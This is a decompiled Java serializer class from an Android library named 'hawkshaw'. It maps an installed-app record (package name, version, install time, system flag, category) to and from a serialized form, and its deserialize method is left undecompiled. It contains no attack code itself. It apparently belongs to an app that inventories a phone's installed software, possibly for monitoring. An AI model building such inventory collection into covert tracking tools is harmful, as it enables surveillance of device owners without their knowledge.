package com.hawkshaw.library.datalayer.models;

import D3.b;
import E3.C0026g;
import E3.C0029h0;
import E3.H;
import E3.V;
import E3.u0;
import Y1.K;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;
import w3.w;

public final class InstalledApp$$serializer implements H {
    public static final InstalledApp$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        InstalledApp$$serializer installedApp$$serializer = new InstalledApp$$serializer();
        INSTANCE = installedApp$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.InstalledApp", installedApp$$serializer, 8);
        pluginGeneratedSerialDescriptor.l("name", false);
        pluginGeneratedSerialDescriptor.l("package_name", false);
        pluginGeneratedSerialDescriptor.l("version_name", false);
        pluginGeneratedSerialDescriptor.l("version_code", false);
        pluginGeneratedSerialDescriptor.l("first_install_time", false);
        pluginGeneratedSerialDescriptor.l("is_system_app", false);
        pluginGeneratedSerialDescriptor.l("category", false);
        pluginGeneratedSerialDescriptor.l("enabled", false);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private InstalledApp$$serializer() {
    }

    public KSerializer[] childSerializers() {
        KSerializer[] access$get$childSerializers$cp = InstalledApp.$childSerializers;
        u0 u0Var = u0.f536a;
        KSerializer n4 = w.n(u0Var);
        KSerializer kSerializer = access$get$childSerializers$cp[6];
        V v4 = V.f466a;
        C0026g gVar = C0026g.f495a;
        return new KSerializer[]{u0Var, u0Var, n4, v4, v4, gVar, kSerializer, gVar};
    }

    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r7v2, resolved type: java.lang.Object} */
    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r12v3, resolved type: java.lang.String} */
    /* JADX WARNING: Multi-variable type inference failed */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public com.hawkshaw.library.datalayer.models.InstalledApp deserialize(kotlinx.serialization.encoding.Decoder r22) {
        /*
            r21 = this;
            r0 = r22
            java.lang.String r1 = "decoder"
            Y1.K.n(r0, r1)
            kotlinx.serialization.descriptors.SerialDescriptor r1 = r21.getDescriptor()
            D3.a r0 = r0.a(r1)
            kotlinx.serialization.KSerializer[] r2 = com.hawkshaw.library.datalayer.models.InstalledApp.$childSerializers
            r3 = 1
            r4 = 0
            r5 = 0
            r6 = 0
            r9 = r4
            r17 = r9
            r19 = r17
            r10 = r5
            r11 = r10
            r12 = r11
            r13 = r6
            r15 = r13
            r6 = r3
        L_0x0023:
            if (r6 == 0) goto L_0x007b
            int r7 = r0.y(r1)
            switch(r7) {
                case -1: goto L_0x0079;
                case 0: goto L_0x0072;
                case 1: goto L_0x006b;
                case 2: goto L_0x005e;
                case 3: goto L_0x0056;
                case 4: goto L_0x004e;
                case 5: goto L_0x0046;
                case 6: goto L_0x003a;
                case 7: goto L_0x0032;
                default: goto L_0x002c;
            }
        L_0x002c:
            B3.m r0 = new B3.m
            r0.<init>(r7)
            throw r0
        L_0x0032:
            r7 = 7
            boolean r19 = r0.i(r1, r7)
            r9 = r9 | 128(0x80, float:1.8E-43)
            goto L_0x0023
        L_0x003a:
            r7 = 6
            r8 = r2[r7]
            java.lang.Object r5 = r0.l(r1, r7, r8, r5)
            com.hawkshaw.library.datalayer.models.InstalledApp$Category r5 = (com.hawkshaw.library.datalayer.models.InstalledApp.Category) r5
            r9 = r9 | 64
            goto L_0x0023
        L_0x0046:
            r7 = 5
            boolean r17 = r0.i(r1, r7)
            r9 = r9 | 32
            goto L_0x0023
        L_0x004e:
            r7 = 4
            long r15 = r0.D(r1, r7)
            r9 = r9 | 16
            goto L_0x0023
        L_0x0056:
            r7 = 3
            long r13 = r0.D(r1, r7)
            r9 = r9 | 8
            goto L_0x0023
        L_0x005e:
            E3.u0 r7 = E3.u0.f536a
            r8 = 2
            java.lang.Object r7 = r0.f(r1, r8, r7, r12)
            r12 = r7
            java.lang.String r12 = (java.lang.String) r12
            r9 = r9 | 4
            goto L_0x0023
        L_0x006b:
            java.lang.String r11 = r0.q(r1, r3)
            r9 = r9 | 2
            goto L_0x0023
        L_0x0072:
            java.lang.String r10 = r0.q(r1, r4)
            r9 = r9 | 1
            goto L_0x0023
        L_0x0079:
            r6 = r4
            goto L_0x0023
        L_0x007b:
            r0.c(r1)
            com.hawkshaw.library.datalayer.models.InstalledApp r0 = new com.hawkshaw.library.datalayer.models.InstalledApp
            r20 = 0
            r8 = r0
            r18 = r5
            r8.<init>(r9, r10, r11, r12, r13, r15, r17, r18, r19, r20)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.InstalledApp$$serializer.deserialize(kotlinx.serialization.encoding.Decoder):com.hawkshaw.library.datalayer.models.InstalledApp");
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, InstalledApp installedApp) {
        K.n(encoder, "encoder");
        K.n(installedApp, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        InstalledApp.write$Self$library_release(installedApp, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
